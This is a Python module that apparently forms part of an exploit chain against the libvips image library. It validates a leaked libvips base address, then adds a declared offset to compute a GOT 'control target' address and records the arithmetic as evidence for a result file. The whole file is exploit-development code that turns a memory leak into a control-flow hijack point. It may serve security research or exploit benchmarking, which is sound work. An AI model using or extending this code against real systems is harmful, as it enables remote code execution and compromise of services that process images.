#!/usr/bin/env python3
"""Derive the runtime GOT control target from the leaked libvips base."""

from __future__ import annotations

from dataclasses import dataclass

from stack_profile import NativeStackProfile


@dataclass(frozen=True)
class RuntimeControlTarget:
    module: str
    module_base: int
    module_build_id: str
    symbol: str
    offset: int
    address: int
    abi: str
    validating_bytes: bytes

    def evidence(self) -> dict[str, object]:
        """Return auditable base-plus-offset arithmetic for result JSON."""
        return {
            "module": self.module,
            "module_base": hex(self.module_base),
            "module_build_id": self.module_build_id,
            "symbol": self.symbol,
            "offset": hex(self.offset),
            "address": hex(self.address),
            "derivation": (
                f"{hex(self.module_base)} + {hex(self.offset)} = {hex(self.address)}"
            ),
            "abi": self.abi,
            "validating_bytes": self.validating_bytes.hex(),
        }


def derive_control_target(
    libvips_base: int,
    profile: NativeStackProfile,
) -> RuntimeControlTarget:
    """Resolve one declared helper inside the remotely selected libvips DSO."""
    leak = profile.libvips.leak
    if isinstance(libvips_base, bool) or not isinstance(libvips_base, int):
        raise ValueError("libvips base must be an integer")
    if libvips_base & (leak.base_alignment - 1):
        raise ValueError("libvips base is not page-aligned")
    if not leak.pointer_min <= libvips_base < leak.pointer_max:
        raise ValueError("libvips base is outside the canonical profile range")
    declared = profile.libvips.control_target
    address = libvips_base + declared.offset
    if address <= libvips_base or address > 0xFFFFFFFFFFFFFFFF:
        raise ValueError("control target address overflowed its module base")
    if not leak.pointer_min <= address < leak.pointer_max:
        raise ValueError("control target is outside the canonical profile range")
    return RuntimeControlTarget(
        module=declared.module,
        module_base=libvips_base,
        module_build_id=profile.libvips.build_id,
        symbol=declared.symbol,
        offset=declared.offset,
        address=address,
        abi=declared.abi,
        validating_bytes=declared.bytes,
    )
